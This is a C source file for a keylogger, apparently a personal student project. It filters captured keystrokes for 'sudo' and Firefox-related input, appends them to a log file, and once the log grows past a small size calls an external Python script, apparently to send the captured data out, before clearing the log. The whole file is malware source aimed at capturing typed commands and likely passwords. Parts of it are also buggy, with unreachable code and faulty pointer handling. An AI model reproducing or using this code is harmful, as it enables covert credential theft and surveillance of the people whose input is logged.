/*
** main.c for keylogger in /home/azword/delivery/Perso/PSU/Keylogger
**
** Made by Nathan Tréhout | Az'
** Login   <nathan.trehout@epitech.eu>
**
** Started on  Mon Dec 19 16:49:34 2016 Nathan Trehout
** Last update Sat Dec 31 14:58:33 2016 Nathan Trehout
*/

#include "my.h"

int	firefox = 0;

int	find_command(char *str)
{
  int	i;

  i = 0;
  while (str[i])
    {
      if (str[i] == 's' && str[i + 1] == 'u' && str[i + 2] == 'd' && str[i + 3] == 'o')
	return (i);
      else if (str[i] == 'f' && str[i + 1] == 'i' && str[i + 2] == 'r' && str[i + 3] == 'e')
	{
	  firefox = 1;
	  return (i);
	}
      i++;
    }
  return (-1);
}

int	verif_file(char *to_write)
{
  int	fd;
  char	buffer[5000];
  int	i;
  FILE	*file;

  i = 0;
  fd = open("logs/log", S_IRUSR);
  read(fd, buffer, 5000);
  while (buffer[i])
    i++;
  if (i > 40)
    {
      system("python utils/send.py");
      file = fopen("logs/log", "w");
    }
  return (0);
  file = fopen("sudo.txt", "w");
  fputs(to_write, file);
}

int	put_in_file(char *str, int i)
{
  FILE	*file;

  file = fopen("logs/log", "aw+");
  verif_file(str);
  while (i != 0)
    {
      i--;
      *str++;
    }
  if (firefox == 0)
    str[i + 50] = '\0';
  else if (firefox == 1)
    str[i + 300] = '\0';
  fputs("{ CMD : ", file);
  fputs(str, file);
  fputs("}", file);
  fputs("\n", file);
  fclose(file);
  return (0);
}

int	store_send_input(char *key_logs)
{
  int	i;

  i = find_command(key_logs);
  if (i != -1)
    put_in_file(key_logs, i);
  return (0);
}
